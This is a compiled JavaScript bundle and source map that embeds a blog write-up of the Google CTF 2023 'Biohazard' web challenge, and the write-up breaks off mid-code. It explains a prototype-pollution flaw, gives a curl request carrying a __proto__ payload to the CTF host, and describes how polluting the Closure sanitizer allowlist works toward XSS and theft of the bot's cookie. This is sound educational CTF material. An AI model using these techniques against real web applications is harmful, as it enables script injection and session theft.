{"version":3,"file":"component---src-pages-blog-posts-mdx-frontmatter-slug-tsx-content-file-path-blog-gctf-2023-web-biohazard-mdx-9ea7aba7a4823cc68978.js","mappings":"sLAGA,SAASA,EAAkBC,GACzB,MAAMC,EAAcC,OAAOC,OAAO,CAChCC,EAAG,IACHC,KAAM,OACNC,GAAI,KACJC,GAAI,KACJC,GAAI,KACJC,EAAG,IACHC,GAAI,KACJC,IAAK,MACLC,GAAI,OACHC,EAAAA,EAAAA,MAAsBb,EAAMc,YAC/B,OAAOC,EAAAA,cAAoBA,EAAAA,SAAgB,KAAMA,EAAAA,cAAoBd,EAAYG,EAAG,KAAM,cAAeW,EAAAA,cAAoBd,EAAYI,KAAM,KAAM,kEAAmEU,EAAAA,cAAoBd,EAAYK,IAAK,KAAM,OAAQS,EAAAA,cAAoBd,EAAYI,KAAM,KAAM,mDAAoD,KAAMU,EAAAA,cAAoBd,EAAYM,IAAK,KAAMQ,EAAAA,cAAoBd,EAAYO,GAAI,KAAM,gBAAiB,KAAMO,EAAAA,cAAoBd,EAAYG,EAAG,KAAM,6TAA8TW,EAAAA,cAAoBd,EAAYQ,EAAG,CACr2BO,KAAM,0FACL,oBAAqB,KAAM,KAAMD,EAAAA,cAAoBd,EAAYG,EAAG,KAAMW,EAAAA,cAAoBd,EAAYS,GAAI,KAAM,6KAA8K,KAAMK,EAAAA,cAAoBd,EAAYG,EAAG,KAAM,6BAA8BW,EAAAA,cAAoBd,EAAYQ,EAAG,CACnZO,KAAM,qMACL,YAAa,mDAAoD,KAAMD,EAAAA,cAAoBd,EAAYU,IAAK,KAAMI,EAAAA,cAAoBd,EAAYI,KAAM,KAAM,mkBAAokB,KAAMU,EAAAA,cAAoBd,EAAYO,GAAI,KAAM,8BAA+B,KAAMO,EAAAA,cAAoBd,EAAYG,EAAG,KAAM,6JAA8JW,EAAAA,cAAoBd,EAAYI,KAAM,KAAM,UAAW,+bAAkc,KAAMU,EAAAA,cAAoBd,EAAYO,GAAI,KAAM,mCAAoC,KAAMO,EAAAA,cAAoBd,EAAYG,EAAG,KAAM,kQAAmQW,EAAAA,cAAoBd,EAAYI,KAAM,KAAM,kCAAmC,qHAAsHU,EAAAA,cAAoBd,EAAYI,KAAM,KAAM,kBAAmB,8OAA+O,KAAMU,EAAAA,cAAoBd,EAAYO,GAAI,KAAM,uBAAwB,KAAMO,EAAAA,cAAoBd,EAAYG,EAAG,KAAM,+KAAgL,KAAMW,EAAAA,cAAoBd,EAAYG,EAAG,KAAM,6fAAggB,KAAMW,EAAAA,cAAoBd,EAAYU,IAAK,KAAMI,EAAAA,cAAoBd,EAAYI,KAAM,CAC9xGY,UAAW,eACV,4EAA6E,KAAMF,EAAAA,cAAoBd,EAAYG,EAAG,KAAM,gCAAiCW,EAAAA,cAAoBd,EAAYI,KAAM,KAAM,OAAQ,qBAAsBU,EAAAA,cAAoBd,EAAYI,KAAM,KAAM,YAAa,sCAAwCU,EAAAA,cAAoBd,EAAYI,KAAM,KAAM,QAAS,8BAA+BU,EAAAA,cAAoBd,EAAYI,KAAM,KAAM,oBAAqB,KAAM,KAAMU,EAAAA,cAAoB,QAAS,KAAMA,EAAAA,cAAoBd,EAAYQ,EAAG,CAChjBO,KAAM,4DACL,qEAAsE,KAAMD,EAAAA,cAAoBd,EAAYW,GAAI,KAAM,UAAWG,EAAAA,cAAoBd,EAAYI,KAAM,KAAM,8BAA+B,QAAS,KAAMU,EAAAA,cAAoBd,EAAYG,EAAG,KAAM,kDAAmDW,EAAAA,cAAoBd,EAAYI,KAAM,KAAM,iBAAkB,0EAA2EU,EAAAA,cAAoBd,EAAYI,KAAM,KAAM,oBAAqB,0DAA2D,KAAMU,EAAAA,cAAoBd,EAAYU,IAAK,KAAMI,EAAAA,cAAoBd,EAAYI,KAAM,KAAM,gHAAqH,KAAMU,EAAAA,cAAoB,QAAS,KAAMA,EAAAA,cAAoBd,EAAYQ,EAAG,CAC31BO,KAAM,iGACL,kCAAmC,KAAMD,EAAAA,cAAoBd,EAAYW,GAAI,KAAM,4DAA6D,KAAMG,EAAAA,cAAoBd,EAAYG,EAAG,KAAM,mMAAoMW,EAAAA,cAAoBd,EAAYI,KAAM,KAAM,iCAAkC,uGAAwG,KAAMU,EAAAA,cAAoBd,EAAYG,EAAG,KAAM,mBAAoBW,EAAAA,cAAoBd,EAAYI,KAAM,KAAM,mBAAoB,8CAA+C,KAAMU,EAAAA,cAAoBd,EAAYU,IAAK,KAAMI,EAAAA,cAAoBd,EAAYI,KAAM,CACn0BY,UAAW,eACV,sIAA+I,KAAMF,EAAAA,cAAoBd,EAAYG,EAAG,KAAM,uBAAwBW,EAAAA,cAAoBd,EAAYI,KAAM,KAAM,mBAAoB,oEAAqE,KAAMU,EAAAA,cAAoBd,EAAYU,IAAK,KAAMI,EAAAA,cAAoBd,EAAYI,KAAM,CACnbY,UAAW,eACV,8HAAqI,KAAMF,EAAAA,cAAoBd,EAAYG,EAAG,KAAM,kEAAmEW,EAAAA,cAAoBd,EAAYI,KAAM,KAAM,WAAY,KAAM,KAAMU,EAAAA,cAAoBd,EAAYU,IAAK,KAAMI,EAAAA,cAAoBd,EAAYI,KAAM,CAC7YY,UAAW,eACV,2iBAA4iB,KAAMF,EAAAA,cAAoBd,EAAYG,EAAG,KAAM,uFAAwFW,EAAAA,cAAoBd,EAAYI,KAAM,KAAM,gBAAiB,2EAA4EU,EAAAA,cAAoBd,EAAYI,KAAM,KAAM,eAAgB,UAAWU,EAAAA,cAAoBd,EAAYI,KAAM,KAAM,eAAgB,sCAAuCU,EAAAA,cAAoBd,EAAYI,KAAM,KAAM,WAAY,mBAAoBU,EAAAA,cAAoBd,EAAYI,KAAM,KAAM,QAAS,4DAA6D,KAAMU,EAAAA,cAAoBd,EAAYU,IAAK,KAAMI,EAAAA,cAAoBd,EAAYI,KAAM,CAC5vCY,UAAW,eACV,gQAAiR,KAAMF,EAAAA,cAAoBd,EAAYG,EAAG,KAAM,mCAAoCW,EAAAA,cAAoBd,EAAYI,KAAM,KAAM,gBAAiB,iBAAkBU,EAAAA,cAAoBd,EAAYI,KAAM,KAAM,WAAY,WAAYU,EAAAA,cAAoBd,EAAYI,KAAM,KAAM,gBAAiB,OAAQU,EAAAA,cAAoBd,EAAYI,KAAM,KAAM,gBAAiB,oBAAqBU,EAAAA,cAAoBd,EAAYI,KAAM,KAAM,gBAAiB,mBAAoBU,EAAAA,cAAoBd,EAAYI,KAAM,KAAM,aAAc,sCAAuCU,EAAAA,cAAoBd,EAAYI,KAAM,KAAM,qBAAsB,YAAaU,EAAAA,cAAoBd,EAAYI,KAAM,KAAM,wDAAyD,KAAM,KAAMU,EAAAA,cAAoBd,EAAYG,EAAG,KAAM,8BAA+BW,EAAAA,cAAoBd,EAAYI,KAAM,KAAM,8CAA+C,uGAAwGU,EAAAA,cAAoBd,EAAYI,KAAM,KAAM,aAAc,WAAYU,EAAAA,cAAoBd,EAAYI,KAAM,KAAM,eAAgB,2BAA4BU,EAAAA,cAAoBd,EAAYI,KAAM,KAAM,4BAA+B,yEAA0EU,EAAAA,cAAoBd,EAAYI,KAAM,KAAM,+DAAoE,YAAaU,EAAAA,cAAoBd,EAAYI,KAAM,KAAM,4CAAiD,MAAO,KAAMU,EAAAA,cAAoBd,EAAYG,EAAG,KAAM,8CAA+CW,EAAAA,cAAoBd,EAAYI,KAAM,KAAM,4BAA+B,mBAAoBU,EAAAA,cAAoBd,EAAYI,KAAM,KAAM,oBAAqB,kGAAmGU,EAAAA,cAAoBd,EAAYI,KAAM,KAAM,oBAAqB,wFAAyF,KAAMU,EAAAA,cAAoBd,EAAYG,EAAG,KAAM,+MAAgNW,EAAAA,cAAoBd,EAAYI,KAAM,KAAM,YAAa,cAAe,KAAMU,EAAAA,cAAoBd,EAAYO,GAAI,KAAM,gEAAiE,KAAMO,EAAAA,cAAoBd,EAAYG,EAAG,KAAM,YAAaW,EAAAA,cAAoBd,EAAYQ,EAAG,CAClzFO,KAAM,6JACL,iCAAkC,sGAAuG,KAAMD,EAAAA,cAAoBd,EAAYG,EAAG,KAAM,gFAAiFW,EAAAA,cAAoBd,EAAYQ,EAAG,CAC7SO,KAAM,4GACL,0BAA2B,6CAA8CD,EAAAA,cAAoBd,EAAYI,KAAM,KAAM,YAAa,uBAAwBU,EAAAA,cAAoBd,EAAYI,KAAM,KAAM,KAAM,kCAAmCU,EAAAA,cAAoBd,EAAYI,KAAM,KAAM,kBAAmB,6BAA8B,KAAMU,EAAAA,cAAoBd,EAAYU,IAAK,KAAMI,EAAAA,cAAoBd,EAAYI,KAAM,CACpaY,UAAW,eACV,wHAA6H,KAAMF,EAAAA,cAAoBd,EAAYG,EAAG,KAAM,kGAAmGW,EAAAA,cAAoBd,EAAYI,KAAM,KAAM,qBAAsB,cAAeU,EAAAA,cAAoBd,EAAYI,KAAM,KAAM,oDAAyD,gCAAiC,KAAMU,EAAAA,cAAoBd,EAAYG,EAAG,KAAM,4LAA6L,KAAMW,EAAAA,cAAoBd,EAAYO,GAAI,KAAM,iCAAkC,KAAMO,EAAAA,cAAoBd,EAAYG,EAAG,KAAM,MAAOW,EAAAA,cAAoBd,EAAYI,KAAM,KAAM,WAAY,yCAA0C,KAAMU,EAAAA,cAAoBd,EAAYU,IAAK,KAAMI,EAAAA,cAAoBd,EAAYI,KAAM,CACphCY,UAAW,eACV,8cAA+c,KAAMF,EAAAA,cAAoBd,EAAYG,EAAG,KAAM,mBAAoBW,EAAAA,cAAoBd,EAAYI,KAAM,KAAM,UAAW,kBAAmBU,EAAAA,cAAoBd,EAAYI,KAAM,KAAM,gBAAiB,KAAM,KAAMU,EAAAA,cAAoBd,EAAYU,IAAK,KAAMI,EAAAA,cAAoBd,EAAYI,KAAM,CACvvBY,UAAW,eACV,wGAAyG,KAAMF,EAAAA,cAAoBd,EAAYG,EAAG,KAAM,qCAAsCW,EAAAA,cAAoBd,EAAYI,KAAM,KAAM,WAAY,+DAAgEU,EAAAA,cAAoBd,EAAYI,KAAM,KAAM,oBAAqB,oCAAqCU,EAAAA,cAAoBd,EAAYI,KAAM,KAAM,YAAa,6CAA8CU,EAAAA,cAAoBd,EAAYI,KAAM,KAAM,yBAA0B,oBAAqBU,EAAAA,cAAoBd,EAAYI,KAAM,KAAM,qBAAsB,wBAAyBU,EAAAA,cAAoBd,EAAYI,KAAM,KAAM,UAAW,yIAA0IU,EAAAA,cAAoBd,EAAYQ,EAAG,CAC95BO,KAAM,oHACLD,EAAAA,cAAoBd,EAAYI,KAAM,KAAM,0BAA2B,mFAAoFU,EAAAA,cAAoBd,EAAYI,KAAM,KAAM,sBAAuB,iBAAkBU,EAAAA,cAAoBd,EAAYQ,EAAG,CACpRO,KAAM,yEACL,uCAAwC,uCAAwCD,EAAAA,cAAoBd,EAAYI,KAAM,KAAM,sBAAuB,eAAgBU,EAAAA,cAAoBd,EAAYQ,EAAG,CACvMO,KAAM,wGACL,4BAA6B,aAAcD,EAAAA,cAAoBd,EAAYI,KAAM,KAAM,yCAA0C,8DAA+DU,EAAAA,cAAoBd,EAAYI,KAAM,KAAM,6CAAgD,iEAAkEU,EAAAA,cAAoBd,EAAYI,KAAM,KAAM,iBAAkB,KAAM,KAAMU,EAAAA,cAAoBd,EAAYG,EAAG,KAAM,6CAA8CW,EAAAA,cAAoBd,EAAYI,KAAM,KAAM,UAAW,qCAAsCU,EAAAA,cAAoBd,EAAYI,KAAM,KAAM,wBAAyB,yLAA0LU,EAAAA,cAAoBd,EAAYI,KAAM,KAAM,UAAW,yCAA0CU,EAAAA,cAAoBd,EAAYI,KAAM,KAAM,gBAAiB,KAAM,KAAMU,EAAAA,cAAoBd,EAAYW,GAAI,KAAM,YAAaG,EAAAA,cAAoBd,EAAYI,KAAM,KAAM,iBAAkB,KAAMU,EAAAA,cAAoBd,EAAYG,EAAG,KAAM,6CAA8CW,EAAAA,cAAoBd,EAAYI,KAAM,KAAM,UAAW,oDAAqDU,EAAAA,cAAoBd,EAAYI,KAAM,KAAM,gBAAiB,0TAA2TU,EAAAA,cAAoBd,EAAYI,KAAM,KAAM,gBAAiB,qDAAsD,KAAMU,EAAAA,cAAoBd,EAAYU,IAAK,KAAMI,EAAAA,cAAoBd,EAAYI,KAAM,CACt4DY,UAAW,eACV,oVAAqV,KAAMF,EAAAA,cAAoBd,EAAYW,GAAI,KAAM,mBAAoBG,EAAAA,cAAoBd,EAAYI,KAAM,KAAM,UAAW,iCAAkC,KAAMU,EAAAA,cAAoBd,EAAYG,EAAG,KAAM,4EAA6EW,EAAAA,cAAoBd,EAAYI,KAAM,KAAM,mBAAoB,iDAAkDU,EAAAA,cAAoBd,EAAYI,KAAM,KAAM,WAAY,QAASU,EAAAA,cAAoBd,EAAYI,KAAM,KAAM,iBAAkB,+DAAgE,KAAMU,EAAAA,cAAoBd,EAAYU,IAAK,KAAMI,EAAAA,cAAoBd,EAAYI,KAAM,CACv/BY,UAAW,eACV,mGAAoG,KAAMF,EAAAA,cAAoBd,EAAYG,EAAG,KAAM,iFAAkFW,EAAAA,cAAoBd,EAAYI,KAAM,KAAM,UAAW,uHAAwHU,EAAAA,cAAoBd,EAAYI,KAAM,KAAM,UAAW,iBAAkBU,EAAAA,cAAoBd,EAAYI,KAAM,KAAM,gBAAiB,sFAAuFU,EAAAA,cAAoBd,EAAYI,KAAM,KAAM,oBAAqB,uBAAwBU,EAAAA,cAAoBd,EAAYI,KAAM,KAAM,yBAA0B,uEAAwEU,EAAAA,cAAoBd,EAAYI,KAAM,KAAM,UAAW,0BAA2BU,EAAAA,cAAoBd,EAAYI,KAAM,KAAM,wBAAyB,wEAAyEU,EAAAA,cAAoBd,EAAYI,KAAM,KAAM,UAAW,6FAA8FU,EAAAA,cAAoBd,EAAYI,KAAM,KAAM,UAAW,8LAA+L,KAAMU,EAAAA,cAAoBd,EAAYG,EAAG,KAAM,oFAAqFW,EAAAA,cAAoBd,EAAYI,KAAM,KAAM,UAAW,0EAA2E,KAAMU,EAAAA,cAAoBd,EAAYU,IAAK,KAAMI,EAAAA,cAAoBd,EAAYI,KAAM,CACjyDY,UAAW,eACV,26BAAk+B,KAAMF,EAAAA,cAAoBd,EAAYU,IAAK,KAAMI,EAAAA,cAAoBd,EAAYI,KAAM,CAC1jCY,UAAW,eACV,iRAAkR,KAAMF,EAAAA,cAAoBd,EAAYO,GAAI,KAAM,cAAe,KAAMO,EAAAA,cAAoBd,EAAYG,EAAG,KAAM,iKAAkKW,EAAAA,cAAoBd,EAAYQ,EAAG,CACtkBO,KAAM,8BACL,yBAA0B,4WAC/B,CAKA,MAJA,SAAoBhB,QAAK,IAALA,IAAAA,EAAQ,CAAC,GAC3B,MAAOkB,QAASC,GAAajB,OAAOC,OAAO,CAAC,GAAGU,EAAAA,EAAAA,MAAsBb,EAAMc,YAC3E,OAAOK,EAAYJ,EAAAA,cAAoBI,EAAWnB,EAAOe,EAAAA,cAAoBhB,EAAmBC,IAAUD,EAAkBC,EAC9H,E,oBC5DA,MACMoB,EAAOC,IACX,IAAKC,MAAM,IAACC,GAAI,SAAEC,GAAYH,EAC9B,OAAON,EAAAA,cAAoBU,EAAAA,EAAQ,CACjCC,UAAWH,EAAII,YAAYC,OAC1Bb,EAAAA,cAAoB,MAAO,CAC5BE,UAAW,uCACVF,EAAAA,cAAoB,KAAM,CAC3BE,UAAW,uCACVM,EAAII,YAAYC,OAAQb,EAAAA,cAAoB,MAAO,KAAMA,EAAAA,cAAoB,MAAO,KAAMA,EAAAA,cAAoB,MAAO,CACtHE,UAAW,QACVF,EAAAA,cAAoB,OAAQ,CAC7BE,UAAW,aACVM,EAAII,YAAYE,MAAOd,EAAAA,cAAoB,OAAQ,CACpDE,UAAW,gBACPF,EAAAA,cAAoB,MAAO,CAC/BE,UAAW,iHACVO,GAAWT,EAAAA,cAAoB,MAAO,KAAMA,EAAAA,cAAoB,OAAQ,CACzEE,UAAW,iBACV,cAAe,IAAKM,EAAII,YAAYG,KAAKC,KAAIC,GAAOjB,EAAAA,cAAoBkB,EAAAA,KAAM,CAC/EC,GAAI,cAAgBF,EAAIG,cAAgB,IACxClB,UAAW,kBACVe,QAAS,EAGC,SAASI,EAAiBpC,GACvC,OAAOe,EAAAA,cAAoBK,EAAMpB,EAAOe,EAAAA,cAAoBsB,EAAqBrC,GACnF,C,sECEO,MAAMsC,EAAa,gBAAoB,CAAC,GAiCxC,SAASC,EAAiBzB,GAC/B,MAAM0B,EAAoB,aAAiBF,GAG3C,OAAO,WAAc,IAEO,mBAAfxB,EACFA,EAAW0B,GAGb,IAAIA,KAAsB1B,IAChC,CAAC0B,EAAmB1B,GACzB,C","sources":["webpack://github-pages/./blog/gctf-2023-web-biohazard.mdx","webpack://github-pages/./src/pages/blog/posts/{mdx.frontmatter__slug}.tsx","webpack://github-pages/./node_modules/@mdx-js/react/lib/index.js"],"sourcesContent":["/*@jsxRuntime classic @jsx React.createElement @jsxFrag React.Fragment*/\nimport {useMDXComponents as _provideComponents} from \"@mdx-js/react\";\nimport React from \"react\";\nfunction _createMdxContent(props) {\n  const _components = Object.assign({\n    p: \"p\",\n    code: \"code\",\n    br: \"br\",\n    hr: \"hr\",\n    h2: \"h2\",\n    a: \"a\",\n    em: \"em\",\n    pre: \"pre\",\n    h3: \"h3\"\n  }, _provideComponents(), props.components);\n  return React.createElement(React.Fragment, null, React.createElement(_components.p, null, \"Challenge: \", React.createElement(_components.code, null, \"https://capturetheflag.withgoogle.com/challenges/web-biohazard\"), React.createElement(_components.br), \"\\n\", \"IP: \", React.createElement(_components.code, null, \"https://biohazard-web.2023.ctfcompetition.com/\")), \"\\n\", React.createElement(_components.hr), \"\\n\", React.createElement(_components.h2, null, \"Introduction\"), \"\\n\", React.createElement(_components.p, null, \"Biohazard was a web challenge in the 2023 Google Capture the Flag event. In total 14 teams solved this challenge and the final score for this challenge was 333 points. Although I was not able to solve this challenge during the competition, I did revisit it after the end and worked through it with the help of the \", React.createElement(_components.a, {\n    href: \"https://github.com/google/google-ctf/blob/master/2023/web-biohazard/solution/README.md\"\n  }, \"official writeup\"), \".\"), \"\\n\", React.createElement(_components.p, null, React.createElement(_components.em, null, \"It also seems that this challenge works best in Chrome and Chromium-based browsers due to Trusted Types only being supported in Chrome 83+ and not in Firefox or Safari.\")), \"\\n\", React.createElement(_components.p, null, \"This challenge provides a \", React.createElement(_components.a, {\n    href: \"https://storage.googleapis.com/gctf-2023-attachments-project/cab54183ea79c02df3b72d8e7af82e04957ed2e7c078e97dee5f333ecf9329ea6f1696ad3f5ada440326c25305a4b3aca6bd8f226ddc42d324f4a5b2b33dc387.zip\"\n  }, \"zip file\"), \" with the following Express JS web application.\"), \"\\n\", React.createElement(_components.pre, null, React.createElement(_components.code, null, \"├── bot.js\\n├── Dockerfile\\n├── src\\n│   ├── app.js\\n│   ├── js\\n│   │   ├── package.json\\n│   │   ├── package-lock.json\\n│   │   ├── src\\n│   │   │   ├── editor.js\\n│   │   │   ├── main.js\\n│   │   │   └── sanitizer.js\\n│   │   └── static\\n│   │       ├── bootstrap.js\\n│   │       ├── editor.js\\n│   │       ├── editor.js.map\\n│   │       ├── main.js\\n│   │       ├── main.js.map\\n│   │       ├── README.md\\n│   │       ├── sanitizer.js\\n│   │       └── sanitizer.js.map\\n│   ├── package.json\\n│   ├── package-lock.json\\n│   └── views\\n│       └── main.ejs\\n└── start.sh\\n\")), \"\\n\", React.createElement(_components.h2, null, \"Objective of the challenge\"), \"\\n\", React.createElement(_components.p, null, \"Before we begin to look for an exploit to get the flag, it is a good idea to determine possible exploitation strategies. Based on the presence of the the \", React.createElement(_components.code, null, \"bot.js\"), \" file and the \\\"Report Bio\\\" button when viewing a specific bio, we can assume that we are working towards an XSS attack. This is a very common XSS challenge setup where we need to find an XSS vulnerability, craft a page that exploits this vulnerability and then send the URL for that page to the bot which will open and run the XSS payload. Based on my passed experience, we usually need to exfiltrate the flag from the cookies of the bot user.\"), \"\\n\", React.createElement(_components.h2, null, \"Overview of the web application\"), \"\\n\", React.createElement(_components.p, null, \"The web application allows us to submit a Bio which contains fields such as name, introduction, favorite foods, hobbies, favorite sports and a YouTube video which will be iframed into the introduction. These fields are submitted through a POST request of \", React.createElement(_components.code, null, \"Content-Type: application/json\"), \" and the favorites are submitted as a nested dictionary. The introduction field is text that is inserted into the \", React.createElement(_components.code, null, \"/view/[bio_id]\"), \" page. However, this is protected from XSS attacks by Google's own Closure Library which is used by Google to protect their production software from XSS attacks. Our goal is to somehow bypass these XSS protects and get an XSS exploit.\"), \"\\n\", React.createElement(_components.h2, null, \"Prototype pollution\"), \"\\n\", React.createElement(_components.p, null, \"One of the vulnerabilities in this web application is prototype pollution. Before using it to exploit this challenge, I first did some research to understand how it works.\"), \"\\n\", React.createElement(_components.p, null, \"Prototype pollution is a vulnerability that may exist in programs written in languages with prototype-based inheritance. If we are able to modify or \\\"pollute\\\" the global object prototype, this will be inherited by objects that inherit from that object. The consequence is that this vulnerability can allow us as an attacker to control the property of an object. To see how polluting the prototype can control the property of an object we can purposefully pollute the global object in a JavaScript console.\"), \"\\n\", React.createElement(_components.pre, null, React.createElement(_components.code, {\n    className: \"language-js\"\n  }, \"Object.prototype.polluted = true\\nlet obj = {}\\nobj.polluted === true\\n\")), \"\\n\", React.createElement(_components.p, null, \"In this example, even though \", React.createElement(_components.code, null, \"obj\"), \" doesn't have a \\\"\", React.createElement(_components.code, null, \"polluted\"), \"\\\" property, it is still defined as \", React.createElement(_components.code, null, \"true\"), \" because it was set in the \", React.createElement(_components.code, null, \"Object.prototype\"), \".\"), \"\\n\", React.createElement(\"small\", null, React.createElement(_components.a, {\n    href: \"https://portswigger.net/web-security/prototype-pollution\"\n  }, \"Source (PortSwigger) and more information on prototype pollution\")), \"\\n\", React.createElement(_components.h3, null, \"WTF is \", React.createElement(_components.code, null, \"Object.prototype.__proto__\"), \"????\"), \"\\n\", React.createElement(_components.p, null, \"By reading the mdn web docs, we can learn that \", React.createElement(_components.code, null, \"obj.__proto__\"), \" returns the prototype of an object which usually by default should be \", React.createElement(_components.code, null, \"Object.prototype\"), \" but can also be overwritten to pollute the prototype.\"), \"\\n\", React.createElement(_components.pre, null, React.createElement(_components.code, null, \"let obj = {a: 1, b: 2, \\\"__proto__\\\": {\\\"polluted\\\": true}}\\nObject.getPrototypeOf(obj) // { polluted: true }\\n\")), \"\\n\", React.createElement(\"small\", null, React.createElement(_components.a, {\n    href: \"https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/proto\"\n  }, \"Source (Mozilla mdn web docs)\")), \"\\n\", React.createElement(_components.h3, null, \"How does prototype pollution manifest in this challenge?\"), \"\\n\", React.createElement(_components.p, null, \"Now that we understand prototype pollution, the next obvious question is which part of this web application is vulnerable to web application is vulnerable to it. It turns out that even though \", React.createElement(_components.code, null, \"Object.assign(target, source)\"), \" is not vulnerable to prototype pollution, its specific implementation in this challenge is unsafe.\"), \"\\n\", React.createElement(_components.p, null, \"We can see that \", React.createElement(_components.code, null, \"Object.assign()\"), \" is not vulnerable to prototype pollution.\"), \"\\n\", React.createElement(_components.pre, null, React.createElement(_components.code, {\n    className: \"language-js\"\n  }, \"let obj = {\\\"a\\\": 1, \\\"b\\\": 2}\\nObject.assign(obj, JSON.parse('{\\\"__proto__\\\": {\\\"polluted\\\": \\\"true\\\"}}'))\\nobj.polluted === undefined\\n\")), \"\\n\", React.createElement(_components.p, null, \"However, if we call \", React.createElement(_components.code, null, \"Object.assign()\"), \" with the target set as the prototype of obj, we can pollute it.\"), \"\\n\", React.createElement(_components.pre, null, React.createElement(_components.code, {\n    className: \"language-js\"\n  }, \"let obj = {\\\"a\\\": 1, \\\"b\\\": 2}\\nObject.assign(obj.[\\\"__proto__\\\"], JSON.parse('{\\\"polluted\\\": true}'))\\nobj.polluted === true\\n\")), \"\\n\", React.createElement(_components.p, null, \"Finally, we can examine the code. Specifically, lines 27-46 in \", React.createElement(_components.code, null, \"main.js\"), \".\"), \"\\n\", React.createElement(_components.pre, null, React.createElement(_components.code, {\n    className: \"language-js\"\n  }, \"interestObj = {\\\"favorites\\\":{}};\\nconst uuid = viewPath[1];\\nconst xhr = new XMLHttpRequest();\\nxhr.addEventListener(\\\"load\\\", () => {\\n  if (xhr.status === 200) {\\n    const json = JSON.parse(xhr.response);\\n    for (const key of Object.keys(json)) {\\n      if (interestObj[key] === undefined) {\\n        interestObj[key] = json[key];\\n      } else{\\n        Object.assign(interestObj[key], json[key]);\\n      }\\n    }\\n  } else {\\n    alert(xhr.response);\\n    location.href = '/';\\n  }\\n});\\nxhr.open('GET', `/bio/${uuid}`, false);\\nxhr.send();\\n\")), \"\\n\", React.createElement(_components.p, null, \"To understand this code, it is important to understand what is user controlled. The \", React.createElement(_components.code, null, \"xhr.response\"), \" is user controlled since it is the response body of the GET request to \", React.createElement(_components.code, null, \"/bio/<UUID>\"), \" and a \", React.createElement(_components.code, null, \"/bio/<UUID>\"), \" page by sending a POST request to \", React.createElement(_components.code, null, \"/create\"), \". The following \", React.createElement(_components.code, null, \"curl\"), \" command can be used to send a POST to create a new bio.\"), \"\\n\", React.createElement(_components.pre, null, React.createElement(_components.code, {\n    className: \"language-sh\"\n  }, \"curl 'https://biohazard-web.2023.ctfcompetition.com/create' \\\\\\n  -X POST \\\\\\n  -H 'content-type: application/json' \\\\\\n  --data-raw '{\\\"name\\\":\\\"test\\\",\\\"introduction\\\":\\\"\\\",\\\"favorites\\\":{\\\"hobbies\\\":\\\"\\\",\\\"sports\\\":\\\"\\\"}, \\\"__proto__\\\": {\\\"polluted\\\": true}}' \\\\\\n\")), \"\\n\", React.createElement(_components.p, null, \"Now that we know how to control \", React.createElement(_components.code, null, \"xhr.response\"), \", we see that \", React.createElement(_components.code, null, \"main.js\"), \" passes \", React.createElement(_components.code, null, \"xhr.response\"), \" to \", React.createElement(_components.code, null, \"JSON.parse()\"), \". Interestingly, \", React.createElement(_components.code, null, \"JSON.parse()\"), \" does not treat \", React.createElement(_components.code, null, \"__proto__\"), \" as special in any way. Therefore, \", React.createElement(_components.code, null, \"Object.keys(json)\"), \" returns \", React.createElement(_components.code, null, \"[ 'name', 'introduction', 'favorites', '__proto__' ]\"), \".\"), \"\\n\", React.createElement(_components.p, null, \"So, let's walk through the \", React.createElement(_components.code, null, \"for (const key of Object.keys(json)) {...}\"), \" loop. First, it will loop through name, introduction and favorites. Finally, it will reach the key \", React.createElement(_components.code, null, \"__proto__\"), \". Since \", React.createElement(_components.code, null, \"interestObj\"), \" does have a prototype, \", React.createElement(_components.code, null, \"interestObj[\\\"__proto__\\\"]\"), \" will not be undefined. Therefore, the else block will be executed as \", React.createElement(_components.code, null, \"Object.assign(interestObj[\\\"__proto__\\\"], {\\\"polluted\\\": true})\"), \". (note: \", React.createElement(_components.code, null, \"json[\\\"__proto__\\\"] === {\\\"polluted\\\": true}\"), \").\"), \"\\n\", React.createElement(_components.p, null, \"Also, notice that the prototype that since \", React.createElement(_components.code, null, \"interestObj[\\\"__proto__\\\"]\"), \" is in fact the \", React.createElement(_components.code, null, \"Object.prototype\"), \" (we can test this equality using a JavaScript console), we have now successfully polluted the \", React.createElement(_components.code, null, \"Object.prototype\"), \". This is significant since we can now set values for variables at the global scope.\"), \"\\n\", React.createElement(_components.p, null, \"At this point we have successfully found a prototype pollution vulnerability in the Biohazard web app. We can even test this by creating an object in the browser's JavaScript console and checking for the \", React.createElement(_components.code, null, \"polluted\"), \" property.\"), \"\\n\", React.createElement(_components.h2, null, \"Bypassing Google Closure sanitizer using Prototype Pollution\"), \"\\n\", React.createElement(_components.p, null, \"Based on \", React.createElement(_components.a, {\n    href: \"https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/#:~:text=my%20challenge.-,Closure,-Closure%20Sanitizer%20has\"\n  }, \"research by Michał Bentkowski\"), \", we know that we can bypass the Closure sanitizer if we find a prototype pollution vulnerability.\"), \"\\n\", React.createElement(_components.p, null, \"Internally, the Closure sanitizer uses a whitelist which can be found in the \", React.createElement(_components.a, {\n    href: \"https://github.com/google/closure-library/blob/master/closure/goog/html/sanitizer/attributeallowlists.js\"\n  }, \"attributeallowlists.js\"), \" file. It used the following format where \", React.createElement(_components.code, null, \"TAG_NAME\"), \" is a specific tag, \", React.createElement(_components.code, null, \"*\"), \" is a wildcard for any tag and \", React.createElement(_components.code, null, \"ATTRIBUTE_NAME\"), \" is a specific attribute:\"), \"\\n\", React.createElement(_components.pre, null, React.createElement(_components.code, {\n    className: \"language-js\"\n  }, \"const AllowedAttributes = {\\n  [...]\\n  \\\"TAG_NAME ATTRIBUTE_NAME\\\": true,\\n  \\\"* ATTRIBUTE_NAME\\\": true,\\n  [...]\\n}\\n\")), \"\\n\", React.createElement(_components.p, null, \"So using our prototype pollution vulnerability, we can inject new tags and attributes into the \", React.createElement(_components.code, null, \"AllowedAttributes\"), \" by adding \", React.createElement(_components.code, null, \"{\\\"__proto__\\\": {\\\"TAG_NAME ATTRIBUTE_NAME\\\": true}}\"), \" to the create POST request.\"), \"\\n\", React.createElement(_components.p, null, \"Now that we are able to bypass the Closure sanitizer, all we need to do is bypass the protections defined by the Strict Content Security Policy (CSP) and the Trusted types enforcement.\"), \"\\n\", React.createElement(_components.h2, null, \"Finding the XSS vulnerability\"), \"\\n\", React.createElement(_components.p, null, \"In \", React.createElement(_components.code, null, \"main.js\"), \", we find the following code snippet.\"), \"\\n\", React.createElement(_components.pre, null, React.createElement(_components.code, {\n    className: \"language-js\"\n  }, \"import {trustedResourceUrl} from 'safevalues';\\nimport {safeScriptEl} from 'safevalues/dom';\\n\\n[...]\\n\\nfunction loadEditorResources() {\\n  [...]\\n  const script = document.createElement('script');\\n  